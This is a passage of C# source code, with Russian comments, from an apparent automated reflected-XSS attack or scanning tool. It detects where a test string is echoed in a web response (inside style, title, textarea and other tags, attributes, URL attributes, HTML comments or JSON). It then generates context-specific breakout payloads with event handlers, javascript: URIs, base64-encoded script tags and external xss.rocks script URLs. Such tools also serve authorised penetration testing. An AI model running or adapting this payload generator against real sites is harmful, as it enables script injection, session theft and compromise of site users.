                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    payloadExtra1 = "'></style" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"=.*?" + randomStrXSS))
                                {
                                    payloadExtra1 = "></style" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                            }
                            else if (Regex.IsMatch(getItem, @"<title.*?" + randomStrXSS))
                            {
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    payloadExtra1 = "\"></title" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    payloadExtra1 = "'></title" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"=.*?" + randomStrXSS))
                                {
                                    payloadExtra1 = "></title" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                            }
                            else if (Regex.IsMatch(getItem, @"<noembed.*?" + randomStrXSS))
                            {
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    payloadExtra1 = "\"></noembed" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    payloadExtra1 = "'></noembed" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"=.*?" + randomStrXSS))
                                {
                                    payloadExtra1 = "></noembed" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                            }
                            else if (Regex.IsMatch(getItem, @"<template.*?" + randomStrXSS))
                            {
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    payloadExtra1 = "\"></template" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    payloadExtra1 = "'></template" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"=.*?" + randomStrXSS))
                                {
                                    payloadExtra1 = "></template" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                            }
                            else if (Regex.IsMatch(getItem, @"<noscript.*?" + randomStrXSS))
                            {
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    payloadExtra1 = "\"></noscript" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    payloadExtra1 = "'></noscript" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"=.*?" + randomStrXSS))
                                {
                                    payloadExtra1 = "></noscript" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                            }
                            //<textarea attribute='TEST'>
                            else if (Regex.IsMatch(getItem, @"<textarea.*?" + randomStrXSS))
                            {
                                if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                                {
                                    payloadExtra1 = "\"></textarea" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                                {
                                    payloadExtra1 = "'></textarea" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                                else if (Regex.IsMatch(getItem, @"=.*?" + randomStrXSS))
                                {
                                    payloadExtra1 = "></textarea" + Encoder.XSSfillerClosTag(3) + ">";
                                }
                            }

                            string randInt = Encoder.RandomNumber(5);
                            foreach (string iw in payloadsArr)
                            {
                                payload = Macros.TextProcessing.Replace(iw, "[FILLER1]",
                                    Encoder.XSSfiller1(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER2]",
                                    Encoder.XSSfiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER3]",
                                    Encoder.XSSfiller3(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER4]",
                                    Encoder.XSSfiller4(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER5]",
                                    Encoder.XSSfiller5(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                                    Encoder.XSSfiller6(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                                    Encoder.XSSfiller7(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                                    Encoder.XSSfiller8(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[ATTRVALUE]",
                                    Encoder.XSSAttrAndValue(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[JS]",
                                    Encoder.XSSjs(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDSTR]",
                                    Encoder.RandomString(3), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER1]",
                                    Encoder.XSSscriptFiller1(5), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]",
                                    Encoder.XSSscriptFiller2(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                                    Encoder.XSSjsInScript(), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[DELIMITER]",
                                    Encoder.XSSdelimiter(), "Text", "All");
                                payload = Macros.TextProcessing.Replace(payload, "[RANDINT]",
                                    randInt, "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG]",
                                    Encoder.XSSfillerClosTag(3), "Text", "First");
                                payload = Macros.TextProcessing.Replace(payload, "[javascript]",
                                    Encoder.XSSjavascript(), "Text", "First");
                                if (payload.Contains("[BASE64]"))
                                {
                                    string xssBase64 = Macros.TextProcessing.Spintax(
                                        "{<script>onerror=alert;throw [RANDINT]</script>|<embed src=\"javascript:confirm([RANDINT])\"></embed>|<script>[JS]</script>}");
                                    xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[RANDINT]",
                                        randInt, "Text", "First");
                                    xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[JS]",
                                        Encoder.XSSjs(), "Text", "First");
                                    var xssbs64 = System.Text.Encoding.UTF8.GetBytes(xssBase64);
                                    var xssBase64Final = System.Convert.ToBase64String(xssbs64);
                                    payload = Macros.TextProcessing.Replace(payload, "[BASE64]",
                                        xssBase64Final, "Text", "First");
                                }

                                if (payload.Contains("'"))
                                {
                                    payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                        Macros.TextProcessing.Spintax("{\"|\"||||}"), "Text", "All");
                                }
                                else
                                    payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                        Macros.TextProcessing.Spintax("{\"|\"|'|'||||}"), "Text", "All");

                                //Добавляем в Payloads
                                list.Add(payloadExtra1 + payload + "|ReflectedXSS_" + randInt);
                            }
                        }



                    }
                }

                //3.2 если <> кодированы, то варианты без <> должны быть 
                else if (Regex.IsMatch(getItem, @"'""&lt;" + randomStrXSS + @"&gt;"))
                {
                    //3.2.1 Inside Tag. Url Attribute Value
                    if (Regex.IsMatch(getItem,
                        @"(href|src|srcdoc|action|cite|srcset)=.*?" + randomStrXSS))
                    {
                        string randInt = Encoder.RandomNumber(5);
                        for (int ic = 0; ic < 20; ic++)
                        {
                            payload = Macros.TextProcessing.Replace(Encoder.XSSjs(), "[RANDINT]",
                                randInt, "Text", "First");
                            list.Add(payload + "|ReflectedXSS_" + randInt);
                        }

                        list.Add("http://xss.rocks/scriptlet.html" + "|ReflectedXSS_XSS");
                        list.Add("http://xss.rocks/xss.css" + "|ReflectedXSS_XSS");
                        list.Add("http://xss.rocks/xss.js" + "|ReflectedXSS_XSS");
                    }

                    //3.2.2 Inside Tag. Attribute Value
                    else
                    {
                        string randInt = Encoder.RandomNumber(5);
                        for (int im = 0; im < 20; im++)
                        {
                            //"или'[FILLER5][EVENT][FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]
                            string scheme =
                                "[FILLER5][EVENT][FILLER6]=[QUOTE][FILLER7][JS][FILLER8][QUOTE]";
                            payload = Macros.TextProcessing.Replace(scheme, "[FILLER5]",
                                Encoder.XSSfiller5(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                                Encoder.XSSfiller6(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                                Encoder.XSSfiller7(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                                Encoder.XSSfiller8(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[JS]",
                                Encoder.XSSjs(), "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[RANDINT]", randInt, "Text", "First");
                            payload = Macros.TextProcessing.Replace(payload, "[EVENT]", Macros.TextProcessing.Spintax(
                                    "{onload|onload|onload|onload|onclick|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onclick|onauxclick|ondblclick|ondrag|ondragend|ondragenter|ondragexit|ondragleave|ondragover|ondragstart}"), "Text", "First");
                            if (Regex.IsMatch(getItem, @"="".*" + randomStrXSS))
                            {
                                list.Add("\"" + payload + "|ReflectedXSS_" + randInt);
                            }
                            else if (Regex.IsMatch(getItem, @"='.*" + randomStrXSS))
                            {
                                list.Add("'" + payload + "|ReflectedXSS_" + randInt);
                            }
                            else
                            {
                                list.Add(payload + "|ReflectedXSS_" + randInt);
                            }
                        }
                    }
                }
                ////3.3 если '"<> кодированы, то пропускаем
                //else
                //{
                //	listLog.Add("Attack:XSSReflectionsEncoded|PayloadType:" + strPayloadType + "|DateUnix:" +
                //	            (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds + "|Date:" +
                //	            DateTime.UtcNow + "|" + getLine);
                //}



                //COMMENT. testingPayloadXSS в comment 
                if (Regex.IsMatch(getItem, @"<!--[^--]*" + randomStrXSS + "[^>]*-->"))
                {
                    payloadExtra1 = "-->";
                    string randInt = Encoder.RandomNumber(5);
                    foreach (string ip in payloadsArr)
                    {
                        payload = Macros.TextProcessing.Replace(ip, "[FILLER1]",
                            Encoder.XSSfiller1(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER2]",
                            Encoder.XSSfiller2(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER3]",
                            Encoder.XSSfiller3(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER4]",
                            Encoder.XSSfiller4(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER5]",
                            Encoder.XSSfiller5(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                            Encoder.XSSfiller6(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                            Encoder.XSSfiller7(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                            Encoder.XSSfiller8(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[DELIMITER]",
                            Encoder.XSSdelimiter(), "Text", "All");
                        payload = Macros.TextProcessing.Replace(payload, "[ATTRVALUE]",
                            Encoder.XSSAttrAndValue(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[JS]", Encoder.XSSjs(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[RANDSTR]",
                            Encoder.RandomString(3), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[RANDINT]", randInt, "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG]",
                            Encoder.XSSfillerClosTag(3), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[javascript]",
                            Encoder.XSSjavascript(), "Text", "First");
                        if (payload.Contains("[BASE64]"))
                        {
                            string xssBase64 = Macros.TextProcessing.Spintax(
                                "{<script>onerror=alert;throw [RANDINT]</script>|<embed src=\"javascript:confirm([RANDINT])\"></embed>|<script>[JS]</script>}");
                            xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[RANDINT]", randInt, "Text", "First");
                            xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[JS]",
                                Encoder.XSSjs(), "Text", "First");
                            var xssbs64 = System.Text.Encoding.UTF8.GetBytes(xssBase64);
                            var xssBase64Final = System.Convert.ToBase64String(xssbs64);
                            payload = Macros.TextProcessing.Replace(payload, "[BASE64]", xssBase64Final, "Text", "First");
                        }

                        if (payload.Contains("'"))
                        {
                            payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                Macros.TextProcessing.Spintax("{\"|\"||||}"), "Text", "All");
                        }
                        else
                            payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                Macros.TextProcessing.Spintax("{\"|\"|'|'||||}"), "Text", "All");

                        //Добавляем в Payloads
                        list.Add(payloadExtra1 + payload + "|ReflectedXSS_" + randInt);
                    }
                }

                //JSON. testingPayloadXSS в json 
                //not possible if server responded Content-Type not ...html, as XSS possible only in html  
                //http://c0d3g33k.blogspot.com/2017/11/story-of-json-xss.html
                else if (Regex.IsMatch(getItem, @"(?<=\{)\s*[^{]*?" + randomStrXSS + @".*?(?=[\},])"))
                {
                    string randInt = Encoder.RandomNumber(5);
                    foreach (string iw in payloadsArr)
                    {
                        payload = Macros.TextProcessing.Replace(iw, "[FILLER1]",
                            Encoder.XSSfiller1(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER2]",
                            Encoder.XSSfiller2(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER3]",
                            Encoder.XSSfiller3(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER4]",
                            Encoder.XSSfiller4(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER5]",
                            Encoder.XSSfiller5(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER6]",
                            Encoder.XSSfiller6(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER7]",
                            Encoder.XSSfiller7(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLER8]",
                            Encoder.XSSfiller8(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[ATTRVALUE]",
                            Encoder.XSSAttrAndValue(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[JS]",
                            Encoder.XSSjs(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[RANDSTR]",
                            Encoder.RandomString(3), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER1]",
                            Encoder.XSSscriptFiller1(5), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[SCRIPTFILLER2]",
                            Encoder.XSSscriptFiller2(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[XSSJSINSCRIPT]",
                            Encoder.XSSjsInScript(), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[DELIMITER]",
                            Encoder.XSSdelimiter(), "Text", "All");
                        payload = Macros.TextProcessing.Replace(payload, "[RANDINT]",
                            randInt, "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[FILLERCLOSTAG]",
                            Encoder.XSSfillerClosTag(3), "Text", "First");
                        payload = Macros.TextProcessing.Replace(payload, "[javascript]",
                            Encoder.XSSjavascript(), "Text", "First");

                        if (payload.Contains("[BASE64]"))
                        {
                            string xssBase64 = Macros.TextProcessing.Spintax(
                                "{<script>onerror=alert;throw [RANDINT]</script>|<embed src=\"javascript:confirm([RANDINT])\"></embed>|<script>[JS]</script>}");
                            xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[RANDINT]",
                                randInt, "Text", "First");
                            xssBase64 = Macros.TextProcessing.Replace(xssBase64, "[JS]",
                                Encoder.XSSjs(), "Text", "First");
                            var xssbs64 = System.Text.Encoding.UTF8.GetBytes(xssBase64);
                            var xssBase64Final = System.Convert.ToBase64String(xssbs64);
                            payload = Macros.TextProcessing.Replace(payload, "[BASE64]",
                                xssBase64Final, "Text", "First");

                        }

                        if (payload.Contains("'"))
                        {
                            payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                Macros.TextProcessing.Spintax("{\"|\"||||}"), "Text", "All");
                        }
                        else
                            payload = Macros.TextProcessing.Replace(payload, "[QUOTE]",
                                Macros.TextProcessing.Spintax("{\"|\"|'|'||||}"), "Text", "All");

                        //Добавляем в Payloads
                        list.Add(payload + "|ReflectedXSS_" + randInt);
                    }
                }

            }

            if (list.Count == 0)//т.е. если ничего не добавили в Payloads
            {

                listLog.Add("Attack:XSSReflectionsEncoded" + "|AttackFolder:" + getProfileName + "\\" + requestsID + "|AttackFile:_" + "|RequestsAll:" + requestsID + "_" + strPayloadTypeToPath + "|PayloadType:" + strPayloadType + "|ReasonToLog:" + "|DateUnix:" + (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds + "|Date:" + DateTime.UtcNow + "|" + getLine);
                throw new Exception("XSSReflectionsEncoded");
            }
            //}
        }


        //если в респонсе нет совпадений, то ошибка будет
        else
        {
            listLog.Add("Attack:NoResult" + "|AttackFolder:" + getProfileName + "\\" + requestsID + "|AttackFile:_" + "|RequestsAll:" + requestsID + "_" + strPayloadTypeToPath + "|PayloadType:" + strPayloadType + "|ReasonToLog:" + "|DateUnix:" + (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds + "|Date:" + DateTime.UtcNow + "|" + getLine);
            throw new Exception("XSSReflections in Response = 0");

        }

